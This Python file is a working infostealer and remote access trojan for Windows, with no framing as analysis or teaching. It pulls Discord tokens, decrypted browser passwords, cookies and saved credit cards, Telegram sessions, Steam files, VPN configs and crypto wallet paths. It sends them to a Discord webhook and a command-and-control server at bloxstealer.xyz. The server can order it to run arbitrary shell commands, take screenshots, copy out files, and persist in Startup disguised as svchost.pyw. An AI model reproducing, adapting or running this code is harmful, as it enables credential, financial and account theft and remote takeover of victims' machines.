import os, sys, json, base64, subprocess, time, threading, glob, re, shutil, tempfile, sqlite3, hashlib, struct, io, zipfile
from urllib.request import Request, urlopen
from pathlib import Path

_VID = None
_SERVER = 'https://update.bloxstealer.xyz'
_WH = 'https://ptb.discord.com/api/webhooks/1510251316042137621/N2miPNclVDYYGEdJsZFvmol-97xGjJQkjAdzqnVqSNlEZGAyPfgP_vk10nGYwuvlNE_N'
_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

def _gen_vid():
    raw = os.environ.get('COMPUTERNAME','') + os.environ.get('USERNAME','') + str(int(time.time()))
    return hashlib.md5(raw.encode()).hexdigest()[:12]

def _dc(text):
    try:
        data = json.dumps({'content': str(text)[:1900]}).encode()
        urlopen(Request(_WH, data, {'Content-Type': 'application/json', 'User-Agent': _UA}), timeout=10)
    except:
        pass

def _post(path, data):
    try:
        body = json.dumps(data).encode()
        urlopen(Request(_SERVER + path, body, {'Content-Type': 'application/json'}), timeout=10)
    except:
        pass

def _get(path):
    try:
        return urlopen(Request(_SERVER + path, headers={'User-Agent': _UA}), timeout=10).read().decode()
    except:
        return ''

def _enrich_token(token):
    try:
        r = Request('https://discord.com/api/v9/users/@me')
        r.add_header('Authorization', token)
        r.add_header('User-Agent', _UA)
        return json.loads(urlopen(r, timeout=8).read().decode())
    except:
        return None

def _dc_e(token, info):
    ext = 'gif' if info.get('avatar','').startswith('a_') else 'png'
    av = f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.{ext}"
    pt = {0: 'None', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic'}.get(info.get('premium_type'), '?')
    e = {
        'title': f"{info.get('username','?')}#{info.get('discriminator','0')}  (vid: {_VID})",
        'color': 0x5865F2,
        'thumbnail': {'url': av},
        'fields': [
            {'name': 'Email', 'value': info.get('email','?'), 'inline': True},
            {'name': 'Phone', 'value': info.get('phone','?') or 'None', 'inline': True},
            {'name': 'Nitro', 'value': pt, 'inline': True},
            {'name': 'Verified', 'value': str(info.get('verified','?')), 'inline': True},
            {'name': 'MFA', 'value': str(info.get('mfa_enabled','?')), 'inline': True},
            {'name': 'ID', 'value': info['id'], 'inline': True},
            {'name': 'Token', 'value': f'`{token}`', 'inline': False},
        ]
    }
    try:
        body = json.dumps({'embeds': [e]}).encode()
        urlopen(Request(_WH, body, {'Content-Type': 'application/json', 'User-Agent': _UA}), timeout=10)
    except:
        pass

def _scrape_tokens():
    tokens = set()
    paths = [
        os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordcanary\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\discord\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\discordptb\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\discordcanary\Local Storage\leveldb'),
    ]
    pattern = re.compile(r'[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,}')
    for p in paths:
        if not os.path.isdir(p):
            continue
        for f in glob.glob(os.path.join(p, '*.ldb')) + glob.glob(os.path.join(p, '*.log')):
            try:
                for m in pattern.findall(open(f, 'r', errors='replace').read()):
                    if len(m.split('.')) == 3 and not m.startswith('eyJ') and not m.startswith('eJ'):
                        tokens.add(m)
            except:
                pass
    return list(tokens)

def _chrome_key(browser_dir):
    try:
        import win32crypt
        ls_path = os.path.join(browser_dir, 'Local State')
        if not os.path.exists(ls_path):
            return None
        ls = json.loads(open(ls_path, 'r', encoding='utf-8').read())
        enc_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
        if enc_key[:5] == b'DPAPI':
            enc_key = enc_key[5:]
        key, _ = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)
        return key
    except:
        return None

def _decrypt_chrome_password(enc_val, key):
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        if enc_val[:3] == b'v10' or enc_val[:3] == b'v11':
            nonce = enc_val[3:15]
            ct = enc_val[15:]
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(nonce, ct, None).decode('utf-8', errors='replace')
        return enc_val.decode('utf-8', errors='replace')
    except:
        try:
            import win32crypt
            data, _ = win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)
            return data.decode('utf-8', errors='replace')
        except:
            return '[decrypt failed]'

def _browser_data(db_name, query, browser_dirs):
    results = []
    for bdir in browser_dirs:
        db_path = os.path.join(bdir, 'Default', db_name)
        if not os.path.exists(db_path):
            db_path = os.path.join(bdir, 'Default', 'Network', db_name)
        if not os.path.exists(db_path):
            continue
        key = _chrome_key(bdir)
        try:
            tmp = tempfile.mktemp(suffix='.db')
            shutil.copy2(db_path, tmp)
            conn = sqlite3.connect(tmp)
            cur = conn.cursor()
            for row in cur.execute(query).fetchall():
                results.append((bdir, row))
            conn.close()
            os.remove(tmp)
        except:
            try:
                os.remove(tmp)
            except:
                pass
    return results, key

def _passwords():
    browser_dirs = [
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\Opera Software\Opera Stable'),
    ]
    rows, key = _browser_data('Login Data', 'SELECT origin_url, username_value, password_value FROM logins', browser_dirs)
    out = []
    for bdir, row in rows:
        if key:
            pw = _decrypt_chrome_password(row[2], key)
        else:
            pw = '[no key]'
        out.append(f"{bdir.split(os.sep)[-4]}: {row[0]} | {row[1]} | {pw}")
    return '\n'.join(out) if out else ''

def _cookies():
    browser_dirs = [
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
    ]
    rows, key = _browser_data('Cookies', 'SELECT host_key, name, path, encrypted_value FROM cookies', browser_dirs)
    out = []
    for bdir, row in rows:
        val = _decrypt_chrome_password(row[3], key) if key and row[3] else '[binary]'
        out.append(f"{bdir.split(os.sep)[-4]}: {row[0]}{row[1]} = {val}")
    return '\n'.join(out[:200]) if out else ''

def _cards():
    browser_dirs = [
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
    ]
    rows, key = _browser_data('Web Data', 'SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards', browser_dirs)
    out = []
    for bdir, row in rows:
        num = _decrypt_chrome_password(row[1], key) if key and row[1] else '[encrypted]'
        out.append(f"{bdir.split(os.sep)[-4]}: {row[0]} | {num} | {row[2]}/{row[3]}")
    return '\n'.join(out) if out else ''

def _wallets():
    found = []
    scans = [
        ('Exodus', os.path.expandvars(r'%APPDATA%\Exodus\exodus.wallet')),
        ('Electrum', os.path.expandvars(r'%APPDATA%\Electrum\wallets')),
        ('Atomic', os.path.expandvars(r'%APPDATA%\atomic\Local Storage\leveldb')),
        ('MetaMask', os.path.expandvars(r'%APPDATA%\MetaMask')),
        ('Coinbase Wallet', os.path.expandvars(r'%APPDATA%\io.coinbase.wallet')),
        ('Phantom', os.path.expandvars(r'%APPDATA%\Phantom')),
    ]
    for name, path in scans:
        if os.path.exists(path):
            try:
                size = sum(os.path.getsize(os.path.join(dp, f)) for dp, dn, fn in os.walk(path) for f in fn) if os.path.isdir(path) else os.path.getsize(path)
                found.append(f"{name}: {path} ({size//1024}KB)")
            except:
                found.append(f"{name}: {path}")
    return '\n'.join(found) if found else ''

def _telegram():
    tdata = os.path.expandvars(r'%APPDATA%\Telegram Desktop\tdata')
    if not os.path.isdir(tdata):
        return ''
    try:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
            for root, dirs, files in os.walk(tdata):
                for f in files:
                    fp = os.path.join(root, f)
                    if os.path.getsize(fp) > 10*1024*1024:
                        continue
                    z.write(fp, os.path.relpath(fp, tdata))
        return base64.b64encode(buf.getvalue()).decode()
    except:
        return ''

def _steam():
    steam_dir = os.path.expandvars(r'%APPDATA%\Steam\config')
    if not os.path.isdir(steam_dir):
        return ''
    out = []
    for f in ['loginusers.vdf', 'config.vdf']:
        fp = os.path.join(steam_dir, f)
        if os.path.exists(fp):
            out.append(f"--- {f} ---\n{open(fp, 'r', errors='replace').read()}")
    ssfn = glob.glob(os.path.join(os.path.expandvars(r'%APPDATA%\Steam'), 'ssfn*'))
    for f in ssfn:
        out.append(f"{os.path.basename(f)}: {base64.b64encode(open(f,'rb').read()).decode()}")
    return '\n'.join(out) if out else ''

def _vpn():
    out = []
    ovpn = glob.glob(os.path.expandvars(r'%USERPROFILE%\**\*.ovpn'), recursive=True)
    for f in ovpn:
        try:
            out.append(f"--- {f} ---\n{open(f,'r',errors='replace').read()}")
        except:
            pass
    nord = os.path.expandvars(r'%LOCALAPPDATA%\NordVPN')
    if os.path.isdir(nord):
        out.append(f"NordVPN config present: {nord}")
    return '\n'.join(out) if out else ''

def _nitro():
    patterns = [
        r'(discord\.gift/|gift/|discord\.com/billing/promotions/)[a-zA-Z0-9]+',
        r'(discord\.gift/|gift/|discord\.com/billing/promotions/)[a-zA-Z0-9-]+',
    ]
    found = set()
    scan_dirs = [
        os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\discord\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
    ]
    for sd in scan_dirs:
        if not os.path.isdir(sd):
            continue
        for f in glob.glob(os.path.join(sd, '*.ldb')) + glob.glob(os.path.join(sd, '*.log')):
            try:
                text = open(f, 'r', errors='replace').read()
                for p in patterns:
                    for m in re.findall(p, text, re.IGNORECASE):
                        found.add(m)
            except:
                pass
    return '\n'.join(sorted(found)) if found else ''

def _collect_all():
    data = {}
    data['tokens'] = _scrape_tokens()
    for t in data['tokens']:
        info = _enrich_token(t)
        if info:
            _dc_e(t, info)
    try:
        pw = _passwords()
        if pw:
            _dc(f"Passwords from {_VID}:\n{pw[:1900]}")
    except:
        pass
    try:
        ck = _cookies()
        if ck:
            _dc(f"Cookies from {_VID}:\n{ck[:1900]}")
    except:
        pass
    try:
        cd = _cards()
        if cd:
            _dc(f"Cards from {_VID}:\n{cd[:1900]}")
    except:
        pass
    try:
        w = _wallets()
        if w:
            _dc(f"Wallets from {_VID}:\n{w[:1900]}")
    except:
        pass
    try:
        tg = _telegram()
        if tg:
            _dc(f"Telegram tdata from {_VID} (base64, {len(tg)//1024}KB)")
    except:
        pass
    try:
        st = _steam()
        if st:
            _dc(f"Steam from {_VID}:\n{st[:1900]}")
    except:
        pass
    try:
        vp = _vpn()
        if vp:
            _dc(f"VPN from {_VID}:\n{vp[:1900]}")
    except:
        pass
    try:
        nt = _nitro()
        if nt:
            _dc(f"Nitro codes from {_VID}:\n{nt[:1900]}")
    except:
        pass
    _post('/collect', {'vid': _VID, 'tokens': data['tokens']})

def _identify():
    try:
        tokens = _scrape_tokens()
        for t in tokens:
            info = _enrich_token(t)
            if info:
                _post('/c2/identify', {
                    'vid': _VID,
                    'id': info['id'],
                    'username': info.get('username', '?'),
                    'discriminator': info.get('discriminator', '0'),
                })
                return
    except:
        pass

def _c2_poll():
    while True:
        try:
            resp = _get(f'/c2?vid={_VID}')
            if resp:
                d = json.loads(resp)
                if d.get('ok') and d.get('cmd'):
                    cmd = d['cmd']
                    args = cmd.get('args', '')
                    if cmd['cmd'] == 'screenshot':
                        import io as _io, PIL.ImageGrab as _g
                        img = _g.grab()
                        buf = _io.BytesIO()
                        img.save(buf, 'PNG')
                        b64 = base64.b64encode(buf.getvalue()).decode()
                        _post('/c2/result?vid=' + _VID, {'result': '__screenshot__', 'data': b64})
                    elif cmd['cmd'] == 'shell':
                        try:
                            r = subprocess.run(args, shell=True, capture_output=True, text=True, timeout=30)
                            _post('/c2/result?vid=' + _VID, {'result': r.stdout + r.stderr})
                        except subprocess.TimeoutExpired:
                            _post('/c2/result?vid=' + _VID, {'result': '[timeout]'})
                    elif cmd['cmd'] == 'persist':
                        try:
                            startup = os.path.join(os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup'), 'svchost.pyw')
                            script = Path(sys.argv[0]).resolve() if hasattr(sys, 'argv') and sys.argv[0] else __file__
                            if os.path.exists(script):
                                shutil.copy2(script, startup)
                                _post('/c2/result?vid=' + _VID, {'result': '[persist: startup copy]'})
                            else:
                                _post('/c2/result?vid=' + _VID, {'result': '[persist: no script]'})
                        except Exception as e:
                            _post('/c2/result?vid=' + _VID, {'result': f'[persist error: {e}]'})
                    elif cmd['cmd'] == 'download':
                        fp = args
                        if os.path.exists(fp):
                            with open(fp, 'rb') as f:
                                b64 = base64.b64encode(f.read()).decode()
                            _post('/c2/result?vid=' + _VID, {'result': '__download__', 'data': b64, 'path': fp})
                        else:
                            _post('/c2/result?vid=' + _VID, {'result': f'[not found: {fp}]'})
        except:
            pass
        time.sleep(5)

_VID = _gen_vid()
_hostname = os.environ.get('COMPUTERNAME', '?')
_user = os.environ.get('USERNAME', '?')
_os = sys.platform
_cwd = os.getcwd()
_tokens = _scrape_tokens()

try:
    _post('/c2/register', {
        'vid': _VID, 'hostname': _hostname, 'user': _user,
        'os': _os, 'cwd': _cwd, 'tokens': _tokens[:5],
    })
except:
    pass

try:
    t = threading.Thread(target=_c2_poll, daemon=False)
    t.start()
except:
    pass

_collect_all()

try:
    _identify()
except:
    pass

_dc(f"RAT online: {_hostname} | {_user} | {_os} | vid: {_VID}")
